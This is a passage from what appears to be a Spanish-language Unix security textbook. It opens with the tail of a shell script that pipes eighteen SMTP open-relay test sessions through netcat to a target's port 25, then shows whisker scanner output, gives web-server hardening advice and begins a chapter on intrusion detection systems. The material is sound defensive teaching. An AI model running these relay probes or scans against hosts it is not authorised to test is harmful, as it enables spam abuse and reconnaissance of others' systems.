&#x00A0;SRCDOM=&#x2018;echo&#x00A0;$SRCADDR|awk&#x00A0;-F@&#x00A0;&#x2019;{print&#x00A0;$2}&#x2019;&#x2018;
&#x00A0;#&#x00A0;Direccion&#x00A0;destino,&#x00A0;para&#x00A0;comprobar&#x00A0;si&#x00A0;realmente&#x00A0;llega&#x00A0;el&#x00A0;mail
&#x00A0;#&#x00A0;SUSTITUIR&#x00A0;POR&#x00A0;UNA&#x00A0;QUE&#x00A0;PODAMOS&#x00A0;COMPROBAR!!!
&#x00A0;DSTADDR=toni@aiind.upv.es
&#x00A0;DSTUSR=&#x2018;echo&#x00A0;$DSTADDR|awk&#x00A0;-F@&#x00A0;&#x2019;{print&#x00A0;$1}&#x2019;&#x2018;
&#x00A0;DSTDOM=&#x2018;echo&#x00A0;$DSTADDR|awk&#x00A0;-F@&#x00A0;&#x2019;{print&#x00A0;$2}&#x2019;&#x2018;
&#x00A0;#&#x00A0;Direccion&#x00A0;IP&#x00A0;del&#x00A0;host&#x00A0;a&#x00A0;testear
&#x00A0;TESTIP=&#x2018;host&#x00A0;$1|grep&#x00A0;address|tail&#x00A0;-1|awk&#x00A0;&#x2019;{print&#x00A0;$4}&#x2019;&#x2018;
&#x00A0;if&#x00A0;[&#x00A0;$?&#x00A0;-ne&#x00A0;0&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;TESTIP=&#x2018;/usr/bin/nslookup&#x00A0;$1|grep&#x00A0;&#x02C6;Address|awk&#x00A0;-F:&#x00A0;&#x2019;NR==2&#x00A0;{print&#x00A0;$2}&#x2019;&#x2018;
&#x00A0;fi
&#x00A0;#&#x00A0;Ejecutable&#x00A0;NetCat
&#x00A0;NC=/usr/local/bin/nc
&#x00A0;#&#x00A0;Conectamos&#x00A0;al&#x00A0;servidor&#x00A0;y&#x00A0;lanzamos&#x00A0;los&#x00A0;test
&#x00A0;#&#x00A0;No&#x00A0;ponemos&#x00A0;todo&#x00A0;en&#x00A0;un&#x00A0;&#x2019;cat&#x00A0;&#x003C;&#x003C;EOF&#x2019;&#x00A0;porque&#x00A0;si&#x00A0;se&#x00A0;generan&#x00A0;errores,&#x00A0;el&#x00A0;servidor
&#x00A0;#&#x00A0;de&#x00A0;correo&#x00A0;nos&#x00A0;tirara&#x00A0;y&#x00A0;quedaran&#x00A0;test&#x00A0;sin&#x00A0;realizarse
&#x00A0;#
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCADDR&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTADDR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;1
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTADDR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;2
&#x00A0;.

&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;&#x00A0;&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTADDR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;3
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTADDR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;4
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@[$TESTIP]&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTADDR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;5
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTUSR%$DSTDOM@$1&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;6
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTUSR%$DSTDOM@[$TESTIP]&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;7
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;&#x0022;$DSTADDR&#x0022;&#x003E;

&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;8
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;&#x0022;$DSTUSR%$DSTDOM&#x0022;&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;9
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTADDR@$1&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;10
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;&#x0022;$DSTADDR&#x0022;@$1&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;11
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTADDR@[$TESTIP]&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;12
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;@$1:$DSTADDR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;13
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET

&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;@[$TESTIP]:$DSTADDR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;14
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTDOM!$DSTUSR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;15
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTDOM!$DSTUSR@$1&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;16
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCUSR@$1&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$DSTDOM!$DSTUSR@[$TESTIP]&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;17
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;cat&#x00A0;&#x003C;&#x003C;EOF&#x00A0;|&#x00A0;$NC&#x00A0;$1&#x00A0;25
&#x00A0;RSET
&#x00A0;HELO&#x00A0;$SRCDOM
&#x00A0;MAIL&#x00A0;FROM:&#x00A0;&#x003C;$SRCADDR&#x003E;
&#x00A0;RCPT&#x00A0;TO:&#x00A0;&#x003C;$1!$DSTADDR&#x003E;
&#x00A0;DATA
&#x00A0;Relay&#x00A0;test&#x00A0;no.&#x00A0;18
&#x00A0;.
&#x00A0;QUIT
&#x00A0;EOF
&#x00A0;luisa:~$
</literallayout>
<!--l. 939--><para>Es muy importante para nosotros cuidar cualquier aspecto de la seguridad relativo a nuestros sistemas de
correo, ya que en la actualidad el correo electr&#x00F3;nico constituye uno de los servicios b&#x00E1;sicos de
cualquier empresa; simplemente hemos de contar el n&#x00FA;mero de e-mails que solemos recibir al d&#x02CA;&#x0131;a
para hacernos una idea del desastre que supondr&#x02CA;&#x0131;a un fallo en los sistemas encargados de
procesarlo.

  </para></section><!--end subsection--><!--l. 945--><section 
role="subsection"><title><abbrev role="title-mark">17.5.2</abbrev><anchor 
   id="x1-27900017.5.2"  ></anchor>Ataques v&#x02CA;&#x0131;a web</title>
<!--l. 946--><para>  Durante los &#x00FA;ltimos a~nos los servidores web se han convertido en una excelente fuente de diversi&#x00F3;n para
piratas: cualquier empresa que se precie, desde las m&#x00E1;s peque~nas a las grandes multinacionales,
tiene una p&#x00E1;gina web en las que al menos trata de vender su imagen corporativa. Si hace unos
a~nos un pirata que quisiera atacar a una empresa (y no a todas, ya que muy pocas ten&#x02CA;&#x0131;an
representaci&#x00F3;n en la red) ten&#x02CA;&#x0131;a que agenciarselas para obtener primero informaci&#x00F3;n de la misma y despu&#x00E9;s
buscar errores de con&#xFB01;guraci&#x00F3;n m&#x00E1;s o menos comunes de sus sistemas (o esperar al pr&#x00F3;ximo bug de
sendmail), hoy en d&#x02CA;&#x0131;a le basta con teclear el nombre de su objetivo en un navegador y a~nadir la
coletilla &#x2018;.com&#x2019; detr&#x00E1;s del mismo para contactar con al menos una de sus m&#x00E1;quinas: su servidor
web.
<!--br/-->
<!--br/-->Los ataques a las p&#x00E1;ginas web de una organizaci&#x00F3;n son casi siempre los m&#x00E1;s &#x2018;vistosos&#x2019; que la misma puede
sufrir: en cuesti&#x00F3;n de minutos piratas de todo el mundo se enteran de cualquier problema en la p&#x00E1;gina web
principal de una empresa m&#x00E1;s o menos grande pueda estar sufriendo, y si se trata de una modi&#xFB01;caci&#x00F3;n de
la misma incluso existen recopilatorios de p&#x00E1;ginas &#x2018;hackeadas&#x2019;. Por supuesto, la noticia de la
modi&#xFB01;caci&#x00F3;n salta inmediatamente a los medios, que gracias a ella pueden rellenar alguna cabecera
sensacionalista sobre &#x2018;los piratas de la red&#x2019;, y as&#x02CA;&#x0131; se consigue que la imagen de la empresa atacada caiga
notablemente y la del grupo de piratas suba entre la comunidad &#x2019;underground&#x2019; nacional o
internacional.
<!--br/-->
<!--br/-->La mayor parte de estos ataques tiene &#x00E9;xito gracias a una con&#xFB01;guraci&#x00F3;n incorrecta del servidor o a errores
de dise~no del mismo: si se trata de grandes empresas, los servidores web suelen ser bastante
complejos (alta disponiblidad, balanceo de carga, sistemas propietarios de actualizaci&#x00F3;n de
contenidos&#x2026;) y dif&#x02CA;&#x0131;ciles de administrar correctamente, mientras que si la empresa es peque~na es muy
posible que haya elegido un servidor web simple en su instalaci&#x00F3;n y administraci&#x00F3;n pero en el
cual es casi (&#x00BF;casi?) imposible garantizar una m&#x02CA;&#x0131;nima seguridad: s&#x02CA;&#x0131;, hablamos de Microsoft
Internet Information Server, un sistema que reconocidos expertos en seguridad han recomendado
p&#x00FA;blicamente no utilizar en entornos serios. Sea por el motivo que sea, la cuesti&#x00F3;n es que cada d&#x02CA;&#x0131;a
es m&#x00E1;s sencillo para un pirata ejecutar &#x00F3;rdenes de forma remota en una m&#x00E1;quina, o al menos
modi&#xFB01;car contenidos de forma no autorizada, gracias a los servidores web que un sistema pueda
albergar.
<!--br/-->
<!--br/-->Cualquier analizador de vulnerabilidades que podamos ejecutar contra nuestros sistemas (NESSUS, ISS
Security Scanner, NAI CyberCop Scanner&#x2026;) es capaz de revelar informaci&#x00F3;n que nos va a resultar &#x00FA;til a la
hora de reforzar la seguridad de nuestros servidores web; incluso existen analizadores que est&#x00E1;n dise~nados
para auditar &#x00FA;nicamente este servicio, como whisker. Ejecutando este &#x00FA;ltimo contra una m&#x00E1;quina podemos
obtener resultados similares a los siguientes:

     </para><literallayout role="verbatim">
&#x00A0;anita:~/security/whisker$&#x00A0;./whisker.pl&#x00A0;-h&#x00A0;luisa
&#x00A0;--&#x00A0;whisker&#x00A0;/&#x00A0;v1.4.0&#x00A0;/&#x00A0;rain&#x00A0;forest&#x00A0;puppy&#x00A0;/&#x00A0;www.wiretrip.net&#x00A0;--
&#x00A0;
&#x00A0;=&#x00A0;-&#x00A0;=&#x00A0;-&#x00A0;=&#x00A0;-&#x00A0;=&#x00A0;-&#x00A0;=&#x00A0;-&#x00A0;=
&#x00A0;=&#x00A0;Host:&#x00A0;luisa
&#x00A0;=&#x00A0;Server:&#x00A0;Apache/1.3.19&#x00A0;(Unix)&#x00A0;PHP/4.0.4pl1&#x00A0;mod&#x005F;ssl/2.8.2&#x00A0;OpenSSL/0.9.5a
&#x00A0;
&#x00A0;+&#x00A0;200&#x00A0;OK:&#x00A0;HEAD&#x00A0;/docs/
&#x00A0;+&#x00A0;200&#x00A0;OK:&#x00A0;HEAD&#x00A0;/cgi-bin/Count.cgi
&#x00A0;+&#x00A0;200&#x00A0;OK:&#x00A0;HEAD&#x00A0;/cgi-bin/textcounter.pl
&#x00A0;+&#x00A0;200&#x00A0;OK:&#x00A0;HEAD&#x00A0;/ftp/
&#x00A0;+&#x00A0;200&#x00A0;OK:&#x00A0;HEAD&#x00A0;/guestbook/
&#x00A0;+&#x00A0;200&#x00A0;OK:&#x00A0;HEAD&#x00A0;/usage/
&#x00A0;
&#x00A0;anita:~/security/whisker$
</literallayout>
<!--l. 1008--><para>Podemos ver que el servidor nos proporciona excesiva informaci&#x00F3;n sobre su con&#xFB01;guraci&#x00F3;n (versi&#x00F3;n, m&#x00F3;dulos,
soporte SSL&#x2026;), y que la herramienta ha obtenido algunos archivos y directorios que pueden resultar
interesantes para un atacante: en el caso de los CGI no tiene m&#x00E1;s que acercarse a alguna base de datos de
vulnerabilidades (especialmente recomendables son
<!--br/-->http://www.securityfocus.com/ o http://icat.nist.gov/) e introducir en el buscador
correspondiente el nombre del archivo para obtener informaci&#x00F3;n sobre los posibles problemas de seguridad
que pueda presentar. El caso de los directorios es algo diferente, pero t&#x02CA;&#x0131;picamente se suele tratar de
nombres habituales en los servidores que contienen informaci&#x00F3;n que tambi&#x00E9;n puede resultarle &#x00FA;til a un
potencial atacante.
<!--br/-->
<!--br/-->&#x00BF;C&#x00F3;mo evitar estos problemas de seguridad de los que estamos hablando? Una medida elemental es eliminar
del servidor cualquier directorio o CGI de ejemplo que se instale por defecto; aunque generalmente los
directorios (documentaci&#x00F3;n, ejemplos&#x2026;) no son especialmente cr&#x02CA;&#x0131;ticos, el caso de los CGIs es bastante
alarmante: muchos servidores incorporan programas que no son ni siquiera necesarios para el correcto
funcionamiento del software, y que en ciertos casos &#x2013; demasiados &#x2013; abren enormes agujeros de seguridad,
como el acceso al c&#x00F3;digo fuente de algunos archivos, la lectura de &#xFB01;cheros fuera del DocumentRoot, o incluso
la ejecuci&#x00F3;n remota de comandos bajo la identidad del usuario con que se ejecuta el demonio
servidor.
<!--br/-->
<!--br/-->Otra medida de seguridad b&#x00E1;sica es deshabilitar el Directory Indexing que por defecto muchos servidores
incorporan: la capacidad de obtener el listado de un directorio cuando no existe un &#xFB01;chero
index.html o similar en el mismo; se trata de una medida extremadamente &#x00FA;til y sobre todo
sencilla de implantar, ya que en muchos casos un simple &#x2018;chmod -r&#x2019; sobre el directorio en
cuesti&#x00F3;n es su&#xFB01;ciente para evitar este problema. A primera vista esta medida de protecci&#x00F3;n nos
puede resultar curiosa: a &#xFB01;n de cuentas, a priori todo lo que haya bajo el Document Root
del servidor ha de ser p&#x00FA;blico, ya que para eso se ubica ah&#x02CA;&#x0131;. Evidentemente la teor&#x02CA;&#x0131;a es una
cosa y la pr&#x00E1;ctica otra muy diferente: entre los &#xFB01;cheros de cualquier servidor no es extra~no
encontrar desde archivos de log &#x2013; por ejemplo, del cliente FTP que los usuarios suelen usar para
actualizar remotamente sus p&#x00E1;ginas, como WS<informalequation><graphic 
fileref="unixsec320x.gif"></graphic></informalequation>FTP.LOG &#x2013; hasta paquetes TAR con el contenido de
subdirectorios completos. Por supuesto, la mejor defensa contra estos ataques es evitar de alguna
forma la presencia de estos archivos bajo el Document Root, pero en cualquier caso esto no es
siempre posible, y si un atacante sabe de su existencia puede descargarlos, obteniendo en
muchos casos informaci&#x00F3;n realmente &#x00FA;til para atacar al servidor (como el c&#x00F3;digo de &#xFB01;cheros JSP,
PHP, ASP&#x2026;o simplemente rutas absolutas en la m&#x00E1;quina), y una excelente forma de saber que
uno de estos &#xFB01;cheros est&#x00E1; ah&#x02CA;&#x0131; es justamente el Directory Indexing; por si esto no queda del
todo claro, no tenemos m&#x00E1;s que ir a un buscador cualquiera y buscar la cadena &#x2018;Index of
/admin&#x2019;, por poner un ejemplo sencillo, para hacernos una idea de la peligrosidad de este error de

con&#xFB01;guraci&#x00F3;n.
<!--br/-->
<!--br/-->Adem&#x00E1;s, en cualquier servidor web es muy importante el usuario bajo cuya identidad se ejecuta el demonio
httpd: ese usuario no debe ser nunca el root del sistema (evidente), pero tampoco un usuario gen&#x00E9;rico
como nobody; se ha de tratar siempre de un usuario dedicado y sin acceso real al sistema. Por supuesto,
las p&#x00E1;ginas HTML (los &#xFB01;cheros planos, para entendernos) nunca deben ser de su propiedad, y
mucho menos ese usuario ha de tener permiso de escritura sobre los mismos: con un acceso de
lectura (y ejecuci&#x00F3;n, en caso de CGIs) es m&#x00E1;s que su&#xFB01;ciente en la mayor&#x02CA;&#x0131;a de los casos. Hemos de
tener en cuenta que si el usuario que ejecuta el servidor puede escribir en las p&#x00E1;ginas web, y un
pirata consigue &#x2013; a trav&#x00E9;s de cualquier tipo de error (con&#xFB01;guraci&#x00F3;n, dise~no del demonio&#x2026;) &#x2013;
ejecutar &#x00F3;rdenes bajo la identidad de dicho usuario, podr&#x00E1; modi&#xFB01;car las p&#x00E1;ginas web sin ning&#x00FA;n
problema (que no olvidemos, es lo que perseguir&#x00E1; la mayor&#x02CA;&#x0131;a de atacantes de nuestro servidor
web).
<!--br/-->
<!--br/-->Igual de importante que evitar estos problemas es detectar cuando alguien trata de aprovecharlos
intentando romper la seguridad de nuestros servidores; para conseguirlo no tenemos m&#x00E1;s que aplicar las
t&#x00E9;cnicas de detecci&#x00F3;n de intrusos que veremos en el cap&#x02CA;&#x0131;tulo siguiente. Una caracter&#x02CA;&#x0131;stica importante de los
patrones de detecci&#x00F3;n de ataques v&#x02CA;&#x0131;a web es que no suelen generar muchos falsos positivos, por lo que
la con&#xFB01;guraci&#x00F3;n de la base de datos inicial es r&#x00E1;pida y sencilla, al menos en comparaci&#x00F3;n con
la detecci&#x00F3;n de escaneos de puertos o la de tramas con alguna caracter&#x02CA;&#x0131;stica especial en su
cabecera.


</para><!--l. 1--><para>

  </para></section><!--end subsection--></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-28000018"  ></anchor>Sistemas de detecci&#x00F3;n de intrusos</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">18.1</abbrev><anchor 
   id="x1-28100018.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  A pesar de que un enfoque cl&#x00E1;sico de la seguridad de un sistema inform&#x00E1;tico siempre de&#xFB01;ne
como principal defensa del mismo sus controles de acceso (desde una pol&#x02CA;&#x0131;tica implantada en
un cortafuegos hasta unas listas de control de acceso en un router o en el propio sistema de
&#xFB01;cheros de una m&#x00E1;quina), esta visi&#x00F3;n es extremadamente simplista si no tenemos en cuenta que en
muchos casos esos controles no pueden protegernos ante un ataque (<citation>[?]</citation>). Por poner un ejemplo
sencillo, pensemos en un &#xFB01;rewall donde hemos implantado una pol&#x02CA;&#x0131;tica que deje acceder al
puerto 80 de nuestros servidores web desde cualquier m&#x00E1;quina de Internet; ese cortafuegos s&#x00F3;lo
comprobar&#x00E1; si el puerto destino de una trama es el que hemos decidido para el servicio HTTP, pero
seguramente no tendr&#x00E1; en cuenta si ese tr&#x00E1;&#xFB01;co representa o no un ataque o una violaci&#x00F3;n de nuestra
pol&#x02CA;&#x0131;tica de seguridad: por ejemplo, no detendr&#x00E1; a un pirata que trate de acceder al archivo de
contrase~nas de una m&#x00E1;quina aprovechando un bug del servidor web. Desde un pirata inform&#x00E1;tico
externo a nuestra organizaci&#x00F3;n a un usuario autorizado que intenta obtener privilegios que no
le corresponden en un sistema, nuestro entorno de trabajo no va a estar nunca a salvo de
intrusiones.
<!--br/-->
<!--br/-->Llamaremos intrusi&#x00F3;n a un conjunto de acciones que intentan comprometer la integridad, con&#xFB01;dencialidad
o disponibilidad de un recurso (<citation>[?]</citation>); analizando esta de&#xFB01;nici&#x00F3;n, podemos darnos cuenta de que una intrusi&#x00F3;n
no tiene por qu&#x00E9; consistir en un acceso no autorizado a una m&#x00E1;quina: tambi&#x00E9;n puede ser una
negaci&#x00F3;n de servicio. A los sistemas utilizados para detectar las intrusiones o los intentos de
intrusi&#x00F3;n se les denomina sistemas de detecci&#x00F3;n de intrusiones (Intrusion Detection Systems,
IDS) o, m&#x00E1;s habitualmente &#x2013; y aunque no sea la traducci&#x00F3;n literal &#x2013; sistemas de detecci&#x00F3;n de
intrusos; cualquier mecanismo de seguridad con este prop&#x00F3;sito puede ser considerado un IDS, pero
generalmente s&#x00F3;lo se aplica esta denominaci&#x00F3;n a los sistemas autom&#x00E1;ticos (software o hardware):
es decir, aunque un guardia de seguridad que vigila en la puerta de la sala de operaciones
pueda considerarse en principio como un sistema de detecci&#x00F3;n de intrusos, como veremos a
continuaci&#x00F3;n lo habitual (y l&#x00F3;gico) es que a la hora de hablar de IDSes no se contemplen estos
casos.
<!--br/-->
<!--br/-->Una de las primeras cosas que deber&#x02CA;&#x0131;amos plantearnos a la hora de hablar de IDSes es si realmente
necesitamos uno de ellos en nuestro entorno de trabajo; a &#xFB01;n de cuentas, debemos tener ya un sistema de
protecci&#x00F3;n perimetral basado en cortafuegos, y por si nuestro &#xFB01;rewall fallara, cada sistema habr&#x02CA;&#x0131;a de estar
con&#xFB01;gurado de una manera correcta, de forma que incluso sin cortafuegos cualquier m&#x00E1;quina pudiera
seguirse considerando relativamente segura. La respuesta es, sin duda, s&#x02CA;&#x0131;; debemos esperar que en
cualquier momento alguien consiga romper la seguridad de nuestro entorno inform&#x00E1;tico, y por tanto hemos
de ser capaces de detectar ese problema tan pronto como sea posible (incluso antes de que se produzca,
cuando el potencial atacante se limite a probar suerte contra nuestras m&#x00E1;quinas). Ning&#x00FA;n sistema
inform&#x00E1;tico puede considerarse completamente seguro, pero incluso aunque nadie consiga violar
nuestras pol&#x02CA;&#x0131;ticas de seguridad, los sistemas de detecci&#x00F3;n de intrusos se encargar&#x00E1;n de mostrarnos
todos los intentos de multitud de piratas para penetrar en nuestro entorno, no dej&#x00E1;ndonos
caer en ninguna falsa sensaci&#x00F3;n de seguridad: si somos conscientes de que a diario hay gente
que trata de romper nuestros sistemas, no caeremos en la tentaci&#x00F3;n de pensar que nuestras
m&#x00E1;quinas est&#x00E1;n seguras porque nadie sabe de su existencia o porque no son interesantes para un
pirata.
<!--br/-->
<!--br/-->Los sistemas de detecci&#x00F3;n de intrusos no son precisamente nuevos: el primer trabajo sobre esta materia (<citation>[?]</citation>)
data de 1980; no obstante, este es uno de los campos m&#x00E1;s en auge desde hace ya unos a~nos
dentro de la seguridad inform&#x00E1;tica. Y no es extra~no: la capacidad para detectar y responder ante
los intentos de ataque contra nuestros sistemas es realmente muy interesante. Durante estos
veinte a~nos, cientos de investigadores de todo el mundo han desarrollado, con mayor o menor
&#x00E9;xito, sistemas de detecci&#x00F3;n de todo tipo, desde simples procesadores de logs hasta complejos
sistemas distribuidos, especialmente vigentes con el auge de las redes de computadores en los
&#x00FA;ltimos a~nos; una excelente perspectiva hist&#x00F3;rica de algunos de ellos puede encontrarse en <citation>[?]</citation> o
<citation>[?]</citation>.

  </para></section><!--end section--><!--l. 69--><section 
role="section"><title><abbrev role="title-mark">18.2</abbrev><anchor 
   id="x1-28200018.2"  ></anchor>Clasi&#xFB01;caci&#x00F3;n de los IDSes</title>
<!--l. 70--><para>  Generalmente existen dos grandes enfoques a la hora de clasi&#xFB01;car a los sistemas de detecci&#x00F3;n de intrusos:
o bien en funci&#x00F3;n de qu&#x00E9; sistemas vigilan, o bien en funci&#x00F3;n de c&#x00F3;mo lo hacen.
<!--br/-->
<!--br/-->Si elegimos la primera de estas aproximaciones tenemos dos grupos de sistemas de detecci&#x00F3;n de intrusos: los
que analizan actividades de una &#x00FA;nica m&#x00E1;quina en busca de posibles ataques, y los que lo hacen de una
subred (generalmente, de un mismo dominio de colisi&#x00F3;n) aunque se emplazen en uno s&#x00F3;lo de los hosts de la
misma. Esta &#x00FA;ltima puntualizaci&#x00F3;n es importante: un IDS que detecta actividades sospechosas en una red no
